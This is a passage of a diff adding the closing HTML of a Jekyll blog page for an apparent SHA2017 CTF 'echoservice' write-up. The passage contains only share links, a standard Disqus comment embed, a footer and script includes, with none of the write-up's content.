+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2017/SHA-EchoService/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2017/SHA-EchoService';
+        var disqus_title = 'SHA2017 CTF - echoservice';
+        var disqus_url = 'https://kileak.github.io/ctf/2017/SHA-EchoService';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
